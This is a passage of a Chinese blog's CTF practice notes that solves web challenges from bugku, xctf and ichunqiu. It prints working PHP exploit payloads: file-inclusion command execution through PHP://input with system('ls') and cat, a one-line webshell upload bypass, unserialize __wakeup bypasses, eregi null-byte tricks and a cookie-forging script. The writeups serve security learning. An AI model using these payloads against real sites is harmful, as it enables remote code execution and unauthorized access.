class="hljs-string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="hljs-string">'margin'</span>]==<span class="hljs-string">'margin'</span>)&#123;</span><span class="php">$file_list[<span class="hljs-number">2</span>]=<span class="hljs-string">'keys.php'</span>;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">if</span>(in_array($file,  $file_list))&#123;</span><span class="php">$fa =  file($file);</span><span class="php"><span class="hljs-keyword">echo</span> $fa[$line];</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>cookie加上margin，filename换成keys.php的编码结果，line改成0就得到flag</p><hr><p>never give up(bugku)<br>点进去后发现有个明显的重定向到bugku的主页，用bp抓包发现重定向，以及hello.php的response注释的1p.html，bp抓包发送得到<br><pre><code class="hljs perl">var Words =<span class="hljs-string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span> function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();</code></pre><br>words内容url编码，解码得<br><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">'http://www.bugku.com'</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-comment">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;</span></code></pre><br>注释中内容再base64解码+url解码得<br><pre><code class="hljs stata">";<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>['id'])&#123;header('Location: hello.php?id=1');<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>['id'];<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>['a'];<span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>['b'];<span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,'.'))&#123;echo '<span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">no</span>';<span class="hljs-keyword">return</span> ;&#125;<span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,'r');<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">"bugku is a nice plateform!"</span> and <span class="hljs-variable">$id</span>==0 and <span class="hljs-built_in">strlen</span>(<span class="hljs-variable">$b</span>)&gt;5 and eregi(<span class="hljs-string">"111"</span>.<span class="hljs-built_in">substr</span>(<span class="hljs-variable">$b</span>,0,1),<span class="hljs-string">"1114"</span>) and <span class="hljs-built_in">substr</span>(<span class="hljs-variable">$b</span>,0,1)!=4)&#123;require(<span class="hljs-string">"f4l2a3g.txt"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">print</span> <span class="hljs-string">"never never never give up !!!"</span>;&#125;?&gt;</code></pre><br><del>已经得到了flag存放得目录</del><br>接下来是php黑魔法</p><blockquote><p><a href="https://skysec.top/2017/07/22/PHP%E5%87%BD%E6%95%B0%E9%BB%91%E9%AD%94%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://skysec.top/2017/07/22/PHP%E5%87%BD%E6%95%B0%E9%BB%91%E9%AD%94%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/</a></p></blockquote><p>a,b,id都需要绕过检查：</p><ul><li>id: id==0且id不能为0，id设为字符串即可</li><li>b:  字符串长度大于5，利用eregi匹配漏洞：参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。b用空字符开头即可(注意设置url payload时要用%00，解码后就是空字符)</li><li>a: 内容为bugku is a nice plateform!并且要是数据流，所以a=php://input传输入流即可</li></ul><p><img src="/2020/09/10/20-09-10/Inked%E6%89%B9%E6%B3%A8%202020-09-10%20202551_LI.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p><hr><p>过狗一句话(bugku)<br>被删库了。。。<br>查询php目录：print_r(scandir($dir))</p><hr><p>字符？正则？<br>匹配代码如下<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><span class="php">highlight_file(<span class="hljs-string">'2.php'</span>);  </span><span class="php">$key=<span class="hljs-string">'KEY&#123;********************************&#125;'</span>;  </span><span class="php">$IM= preg_match(<span class="hljs-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="hljs-string">"id"</span>]), $match);  </span><span class="php"><span class="hljs-keyword">if</span>( $IM )&#123;  </span><span class="php"><span class="hljs-keyword">die</span>(<span class="hljs-string">'key is: '</span>.$key);  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>[[:punct:]]匹配标点符号<br>构造payload即可</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20.09.09</title>
    <link href="/2020/09/09/20-09-09/"/>
    <url>/2020/09/09/20-09-09/</url>
    
    <content type="html"><![CDATA[<p>一直把python当成工具库用，好像这思想不太对啊。。。。<br><a id="more"></a></p><hr><p>秋名山老司机(bugku)<br><img src="/2020/09/09/20-09-09/image.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>看源码没发现啥，刷新界面后发现<br><img src="/2020/09/09/20-09-09/image.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>应该是要在快速计算表达式并且提交。拿python 写脚本。<br><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> reurl =  <span class="hljs-string">'http://123.206.87.240:8002/qiumingshan/'</span>s = requests.<span class="hljs-keyword">session</span>()response=s.<span class="hljs-keyword">get</span>(url)response.encoding =  <span class="hljs-string">'utf-8'</span>div=re.<span class="hljs-keyword">search</span>(<span class="hljs-string">'&lt;div&gt;(.*?)=.*?&lt;/div&gt;'</span>,response.text,re.S)cal = div.<span class="hljs-keyword">group</span>(<span class="hljs-number">1</span>)ans =  eval(cal)data=&#123;<span class="hljs-string">'value'</span>:ans&#125;r = s.post(url,data=data)print(r.text)</code></pre><br>通过session建立会话。</p><hr><p>速度要快（bugku）<br>python base64好难用好难用 : )<br>起初界面就说要快一点，查看源码是要提交margin（还以为是交css的margin属性，唉），真的傻乎乎交了margin看到让你快点，写脚本提交还是没有用。（这个人是有多蠢）<br>查看请求头和响应头发现有base64编码的flag（？？），解码后是一堆看不懂得乱码+’:’+字母。且发现每次下发得flag不一样。<br>考虑margin的值就是那串字母，继续写脚本，发现base64的b64decode会把str类型变成bytes，但是split需要str，上网搜索发现函数decode:<br><code>str=bytes.decode()</code><br>解决数据类型的问题后运行脚本还是要我快一点。崩溃<br>一通喝茶后发现flag是二次base64编码（？？？），幸福的连续两场b64decode结果python报错（fu*k）：</p><blockquote><p>UnicodeDecodeError: ‘utf-8’ codec can’t decode byte 0xa0 in position<br>2: invalid start byte</p></blockquote><p>把截取后的那串字母base64解码才成功，得到一串数字。改完后成功得到结果</p><p><del>实在是没有全面系统的学过python，当时简单学过基础语法后就去倒腾爬虫了，结果现在看官方技术文档都累，知识层面还得加强</del></p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20.09.08(写记录好麻烦)</title>
    <link href="/2020/09/08/20-09-08-%E5%86%99%E8%AE%B0%E5%BD%95%E5%A5%BD%E9%BA%BB%E7%83%A6/"/>
    <url>/2020/09/08/20-09-08-%E5%86%99%E8%AE%B0%E5%BD%95%E5%A5%BD%E9%BA%BB%E7%83%A6/</url>
    
    <content type="html"><![CDATA[<p>是懒得写笔记以及成功使用菜刀的一天，检查的时候也顺便检查了一下一直在用的burpsuit的MD5（网站上下的一直懒得检查。。）<br><a id="more"></a><br><code>cmd下检查文件MD5: certutil -hashfile [filename] MD5</code></p><hr><p>upload1(攻防世界/xctf)<br>文件上传表单，随便交了个文件后显示选择图片上传。<br>一句话木马，文件后缀改成jpg，bp拦包修改回php后显示了文件传到的地址，尝试进upload没权限，用菜刀连接，找到flag.php就好了。</p><hr><p>do you know upload(i春秋)<br>又是只能传图片格式，依然是bp拦包修改上传，菜刀连接。<br>没有找到flag，但是在config.php找到数据库信息，连接数据库<br><img src="/2020/09/08/20-09-08-%E5%86%99%E8%AE%B0%E5%BD%95%E5%A5%BD%E9%BA%BB%E7%83%A6/image.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>找到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xctf20.9.07</title>
    <link href="/2020/09/07/xctf20-9-07/"/>
    <url>/2020/09/07/xctf20-9-07/</url>
    
    <content type="html"><![CDATA[<p>接触php序列化的一天。。<br><a id="more"></a></p><hr><p>web php unserialiaze<br>进去就看到php代码<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;  </span><span class="php"><span class="hljs-keyword">private</span> $file = <span class="hljs-string">'index.php'</span>;  </span><span class="php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($file)</span> </span>&#123;  </span><span class="php"><span class="hljs-keyword">$this</span>-&gt;file = $file;  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;  </span><span class="php"><span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-keyword">true</span>);  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;  </span><span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">'index.php'</span>) &#123;  </span><span class="php"><span class="hljs-comment">//the secret is in the fl4g.php  </span></span><span class="php"><span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">'index.php'</span>;  </span><span class="php">&#125;  </span><span class="php">&#125;  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'var'</span>])) &#123;  </span><span class="php">$var = base64_decode($_GET[<span class="hljs-string">'var'</span>]);  </span><span class="php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/[oc]:\d+:/i'</span>, $var)) &#123;  </span><span class="php"><span class="hljs-keyword">die</span>(<span class="hljs-string">'stop hacking!'</span>);  </span><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;  </span><span class="php">@unserialize($var);  </span><span class="php">&#125;  </span><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;  </span><span class="php">highlight_file(<span class="hljs-string">"index.php"</span>);  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>大致思路就是传$file是fl4g.php的Demo类给var，但是需要注意避开preg_match以及魔法函数__warkup()（在unserialize时起作用）的过滤。</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; </span><span class="php">    <span class="hljs-keyword">private</span> $file = <span class="hljs-string">'index.php'</span>;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($file)</span> </span>&#123; </span><span class="php">        <span class="hljs-keyword">$this</span>-&gt;file = $file; </span><span class="php">    &#125;</span><span class="php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123; </span><span class="php">        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-keyword">true</span>); </span><span class="php">    &#125;</span><span class="php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123; </span><span class="php">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">'index.php'</span>) &#123; </span><span class="php">            <span class="hljs-comment">//the secret is in the fl4g.php</span></span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">'index.php'</span>; </span><span class="php">        &#125; </span><span class="php">    &#125; </span><span class="php">&#125;</span><span class="php">$A= <span class="hljs-keyword">new</span> Demo(<span class="hljs-string">'fl4g.php'</span>);</span><span class="php">$B = serialize($A);</span><span class="php">$B = str_replace(<span class="hljs-string">':1:'</span>,<span class="hljs-string">':2:'</span>,$B);<span class="hljs-comment">//绕过wakeup</span></span><span class="php">$B = str_replace(<span class="hljs-string">'O:4'</span>,<span class="hljs-string">'O:+4'</span>,$B);<span class="hljs-comment">//+4绕过/d+的匹配</span></span><span class="php">$B = base64_encode($B);</span><span class="php"><span class="hljs-keyword">echo</span> $B;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>关于php反序列化漏洞：<a href="https://www.guildhab.top/?p=129" target="_blank" rel="noopener">https://www.guildhab.top/?p=129</a></p><hr><p>unserialize<br>还是反序列化，进去后页面上的代码如下<br><pre><code class="hljs awk">class xctf&#123;  public <span class="hljs-variable">$flag</span> = <span class="hljs-string">'111'</span>;  public <span class="hljs-keyword">function</span> __wakeup()&#123;  <span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);  &#125;  ?code=</code></pre><br>绕过<strong>wakeup()即可<br>自己构造?code=o:4:”xctf”:2:{s:4:”flag”;s:3:”111”}（本来是:1:，改成2后属性检查不通过就不触发</strong>wakeup()函数）<br>或者是写php脚本<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;</span><span class="php"><span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;</span><span class="php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;</span><span class="php"><span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);</span><span class="php">&#125;</span><span class="php">&#125;</span><span class="php">$a = <span class="hljs-keyword">new</span> xctf();</span><span class="php">$ans=serialize($a);</span><span class="php"><span class="hljs-keyword">echo</span> $ans;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>Web_php_include<br>进去后看到代码<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>  </span><span class="php">show_source(<span class="hljs-keyword">__FILE__</span>);  </span><span class="php"><span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'hello'</span>];  </span><span class="php">$page=$_GET[<span class="hljs-string">'page'</span>];  </span><span class="php"><span class="hljs-keyword">while</span> (strstr($page, <span class="hljs-string">"php://"</span>)) &#123;  </span><span class="php">$page=str_replace(<span class="hljs-string">"php://"</span>, <span class="hljs-string">""</span>, $page);  </span><span class="php">&#125;  </span><span class="php"><span class="hljs-keyword">include</span>($page);  </span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>过滤php://，大写绕过，想到文件包含漏洞<br>进入?page=PHP://input<br>POST传数据<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>，注意用burpsuit post传参时代码和请求头隔一行<br><img src="/2020/09/07/xctf20-9-07/%E6%89%B9%E6%B3%A8%202020-09-07%20121651.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>得到fl4gisisish3r3.php，index.php，phpinfo.php三个文件<br>再传参<code>&lt;?php system(&#39;cat fl4gisisish3r3.php&#39;);?&gt;</code> 得到flag<br>或者?page=PHP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</p><hr><p>web2<br>根据代码写出解密代码就可以了。<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$miwen=<span class="hljs-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span><span class="hljs-params">($_)</span></span>&#123;</span><span class="php">$_=base64_decode(strrev(str_rot13($_)));</span><span class="php"><span class="hljs-keyword">for</span>($_0=<span class="hljs-number">0</span>;$_0&lt;strlen($_);$_0++)&#123;</span><span class="php">    $_c=substr($_,$_0,<span class="hljs-number">1</span>);</span><span class="php">    $c=ord($_c)<span class="hljs-number">-1</span>;</span><span class="php">    $_c=chr($c);</span><span class="php">    $_o=$_o.$_c;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">echo</span> strrev($_o);</span><span class="php">&#125;</span><span class="php">decode($miwen);</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></p><hr><p>php2<br>进去就一句话<br><img src="/2020/09/07/xctf20-9-07/image.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>结果捣鼓半天完全没有头绪。<br>看wp是index.phps（完全想不到。。。）<br>然后就是根据代码构造id了</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>百度杯九月场code-20.09.06</title>
    <link href="/2020/09/06/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BAcode/"/>
    <url>/2020/09/06/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BAcode/</url>
    
    <content type="html"><![CDATA[<p>Code(ichunqiu)<br><a id="more"></a><br>点开链接只有一张图片，查看源码发现file:hei.jpg以及图片源码的base64编码串，解码没有作用，标题的提示应该是访问jpg的内容，改成1.jpg等显示没有资源的图片。改询问?jpg=index.php，图片链接里又发现base64编码，解码得到：<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31<span class="php"> */</span><span class="php">header(<span class="hljs-string">'content-type:text/html;charset=utf-8'</span>);</span><span class="php"><span class="hljs-keyword">if</span>(! <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'jpg'</span>]))</span><span class="php">    header(<span class="hljs-string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span>);</span><span class="php">$file = $_GET[<span class="hljs-string">'jpg'</span>];</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;title&gt;file:'</span>.$file.<span class="hljs-string">'&lt;/title&gt;'</span>;</span><span class="php">$file = preg_replace(<span class="hljs-string">"/[^a-zA-Z0-9.]+/"</span>,<span class="hljs-string">""</span>, $file);</span><span class="php">$file = str_replace(<span class="hljs-string">"config"</span>,<span class="hljs-string">"_"</span>, $file);</span><span class="php">$txt = base64_encode(file_get_contents($file));</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="hljs-string">"'&gt;&lt;/img&gt;"</span>;</span>/* * Can you find the flag file? *<span class="php"> */</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>知道了过滤方法依然不知道flag在哪。。<br>看题解发现提示在注释里，”created by Phpstorm”，(感觉自己啥也不知道: )  )</p><blockquote><p>phpstorm是php代码的集成开发环境，下载phpstorm，并新建一个项目，会发现在项目文件夹里面会生成一个.idea文件，它存储了项目的配置文件，</p><p>打开.idea文件可以发现misc.xml,modules.xml,workspace.xml文件。</p></blockquote><p>进入.idea/workspace.xml发现有config.php以及fl3g_ichuqiu.php，进config.php发现啥也没有，再进fl3g_ichuqiu.php发现╮(╯▽╰)╭暂时也没什么用。<br>想到之前得到的php代码，尝试访问index.php?jpg=fl3gconfigichuqiu.php，得到又一串base64编码，解码得：<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31<span class="php"> */</span><span class="php">error_reporting(E_ALL || ~E_NOTICE);</span><span class="php"><span class="hljs-keyword">include</span>(<span class="hljs-string">'config.php'</span>);</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">random</span><span class="hljs-params">($length, $chars = <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</span><span class="php">    $hash = <span class="hljs-string">''</span>;</span><span class="php">    $max = strlen($chars) - <span class="hljs-number">1</span>;</span><span class="php">    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)&#123;</span><span class="php">        $hash .= $chars[mt_rand(<span class="hljs-number">0</span>, $max)];</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> $hash;</span><span class="php">&#125;</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span><span class="hljs-params">($txt,$key)</span></span>&#123;</span><span class="php">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><span class="php">        $tmp .= chr(ord($txt[$i])+<span class="hljs-number">10</span>);</span><span class="php">    &#125;</span><span class="php">    $txt = $tmp;</span><span class="php">    $rnd=random(<span class="hljs-number">4</span>);</span><span class="php">    $key=md5($rnd.$key);</span><span class="php">    $s=<span class="hljs-number">0</span>;</span><span class="php">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><span class="php">        <span class="hljs-keyword">if</span>($s == <span class="hljs-number">32</span>) $s = <span class="hljs-number">0</span>;</span><span class="php">        $ttmp .= $txt[$i] ^ $key[++$s];</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> base64_encode($rnd.$ttmp);</span><span class="php">&#125;</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt</span><span class="hljs-params">($txt,$key)</span></span>&#123;</span><span class="php">    $txt=base64_decode($txt);</span><span class="php">    $rnd = substr($txt,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>);</span><span class="php">    $txt = substr($txt,<span class="hljs-number">4</span>);</span><span class="php">    $key=md5($rnd.$key);</span><span class="php">    $s=<span class="hljs-number">0</span>;</span><span class="php">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><span class="php">        <span class="hljs-keyword">if</span>($s == <span class="hljs-number">32</span>) $s = <span class="hljs-number">0</span>;</span><span class="php">        $tmp .= $txt[$i]^$key[++$s];</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</span><span class="php">        $tmp1 .= chr(ord($tmp[$i])<span class="hljs-number">-10</span>);</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> $tmp1;</span><span class="php">&#125;</span><span class="php">$username = decrypt($_COOKIE[<span class="hljs-string">'user'</span>],$key);</span><span class="php"><span class="hljs-keyword">if</span> ($username == <span class="hljs-string">'system'</span>)&#123;</span><span class="php">    <span class="hljs-keyword">echo</span> $flag;</span><span class="php">&#125;<span class="hljs-keyword">else</span>&#123;</span><span class="php">    setcookie(<span class="hljs-string">'user'</span>,encrypt(<span class="hljs-string">'guest'</span>,$key));</span><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"­╮(╯▽╰)╭"</span>;</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>先进输出╮(╯▽╰)╭得网页得到cookie，根据encrypt以及decrypt解出需要得cookie值<br><pre><code class="hljs perl">//要得到flag需要username=<span class="hljs-string">'system'</span>，就需要cookie[<span class="hljs-string">'user'</span>]和key解密得到//username不是<span class="hljs-string">'system'</span>时cookie[<span class="hljs-string">'user'</span>]由<span class="hljs-string">'guest'</span>和key加密得到，根据此可以得到五位key//爆破最后一位key得到第六位即可得到需要的cookie[<span class="hljs-string">'user'</span>]&lt;?phpfunction getAns($txt,$cookie)&#123;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($txt);$i++)&#123;        $tmp.=<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>($txt[$i])+<span class="hljs-number">10</span>);    &#125;    $txt = $tmp;    $cookie = base64_decode($cookie);    $rnd=<span class="hljs-keyword">substr</span>($cookie,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>);    $ttmp=<span class="hljs-keyword">substr</span>($cookie,<span class="hljs-number">4</span>);    $s=<span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($ttmp);$i++)&#123;        $key.=$ttmp[$i]^$txt[$i];    &#125;    $tmp1=<span class="hljs-string">'system'</span>;    $tmp=<span class="hljs-string">''</span>;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($tmp1);$i++)&#123;        $tmp.=<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>($tmp1[$i])+<span class="hljs-number">10</span>);    &#125;    